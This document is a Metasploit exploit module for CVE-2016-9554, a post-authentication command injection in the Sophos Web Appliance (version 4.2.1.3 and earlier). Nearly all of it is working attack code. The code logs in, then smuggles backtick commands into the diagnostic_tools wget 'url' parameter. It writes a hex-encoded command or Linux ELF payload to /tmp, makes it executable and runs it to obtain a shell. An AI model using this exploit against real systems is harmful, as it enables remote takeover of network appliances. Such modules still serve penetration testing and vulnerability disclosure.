# Exploit Title: Sophos Web Appliance diagnostic_tools wget Remote Command Injection Vulnerablity 
# Date: 12/12/2016
# Exploit Author: xort @ Critical Start
# Vendor Homepage: www.sophos.com
# Software Link: sophos.com/en-us/products/secure-web-gateway.aspx
# Version: 4.2.1.3
# Tested on: 4.2.1.3
#            
# CVE : CVE-2016-9554

# vuln:  diagnostic_tools command / host parameter /  MgrReport.php exploit

# Description PostAuth Sophos Web App FW <= v4.2.1.3 for capablities. This exploit leverages a command injection bug. 
#
# xort @ Critical Start

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = ExcellentRanking
	include  Exploit::Remote::Tcp
        include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sophos Web Appliace <= v4.2.1.3 remote exploit',
					'Description'    => %q{
					This module exploits a remote command execution vulnerability in
				the Sophos Web Appliace Version <=  v4.2.1.3. The vulnerability exist in
				a section of the machine's adminstrative infertface for performing diagnostic
				network test with wget and unsanitized unser supplied information. 
			},
			'Author'         =>
				[
					'xort@Critical Start', # vuln + metasploit module
				],
			'Version'        => '$Revision: 1 $',
			'References'     =>
				[
					[ 'none', 'none'],
				],
			'Platform'      => [ 'linux'],
			'Privileged'     => true,
			 'Arch'          => [ ARCH_X86 ],
                        'SessionTypes'  => [ 'shell' ],
                        'Privileged'     => false,

		        'Payload'        =>
                                { 
                                  'Compat' =>
                                  {
                                        'ConnectionType' => 'find',
                                  }
                                },

			'Targets'        =>
				[
					['Linux Universal',
						{
								'Arch' => ARCH_X86,
								'Platform' => 'linux'
						}
					],
				],
			'DefaultTarget' => 0))

			register_options(
				[
					OptString.new('PASSWORD', [ false, 'Device password', "" ]),	
			         	OptString.new('USERNAME', [ true, 'Device password', "admin" ]),	
					OptString.new('CMD', [ false, 'Command to execute', "" ]),	
					Opt::RPORT(443),
				], self.class)
	end

        def do_login(username, password_clear)
                vprint_status( "Logging into machine with credentials...\n" )

                # vars
                timeout = 1550;
                style_key = Rex::Text.rand_text_hex(32)

                # send request  
                res = send_request_cgi(
                {
                      'method'  => 'POST',
                      'uri'     => "/index.php",
                      'vars_get' => {
			   'c' => 'login',
			},
                      'vars_post' =>
                        {

       			  'STYLE' => style_key,
 			  'destination' => '',
			  'section' => '',
			  'username' => username,
			  'password' => password_clear,
                        }
                }, timeout)

                return style_key
        end

	def run_command(username, style_password, cmd)

		vprint_status( "Running Command...\n" )

		# send request with payload	
		res = send_request_cgi({
			'method' => 'POST',
			'vars_post' => {
				'action' => 'wget',
				'section' => 'configuration',
				'STYLE' => style_password ,
				'url' => 'htt%3a%2f%2fwww.google.com%2f`'+cmd+'`',
				},
			'vars_get' => {
				'c' => 'diagnostic_tools',
			},
		})

	end

	
	def exploit
		# timeout
		timeout = 1550;

		# params
		password_clear = datastore['PASSWORD']
		user = datastore['USERNAME']

		# do authentication		
		style_hash = do_login(user, password_clear)
	
		vprint_status("STATUS hash authenticated: #{style_hash}\n")
			
		# pause to let things run smoothly
		sleep(5)

		 #if no 'CMD' string - add code for root shell
                if not datastore['CMD'].nil? and not datastore['CMD'].empty?

                        cmd = datastore['CMD']

                        # Encode cmd payload
                        encoded_cmd = cmd.unpack("H*").join().gsub(/(\w)(\w)/,'\\x\1\2')

                        # kill stale calls to bdump from previous exploit calls for re-use
                        run_command(user, style_hash, ("sudo%20/bin/rm%20-f%20/tmp/n%20;printf%20\"#{encoded_cmd}\"%20>%20/tmp/n;%20chmod%20+rx%20/tmp/n;/tmp/n" ))
                else
                        # Encode payload to ELF file for deployment
                        elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
                        encoded_elf = elf.unpack("H*").join().gsub(/(\w)(\w)/,'\\\\\\x\1\2')

			# upload elf to /tmp/m , chmod +rx /tmp/m , then run /tmp/m (payload)
                        run_command(user, style_hash, ("echo%20-e%20#{encoded_elf}\>%20/tmp/m\;chmod%20%2brx%20/tmp/m\;/tmp/m"))

			# wait for magic
                        handler
			
                end


	end
# sophox-release
end
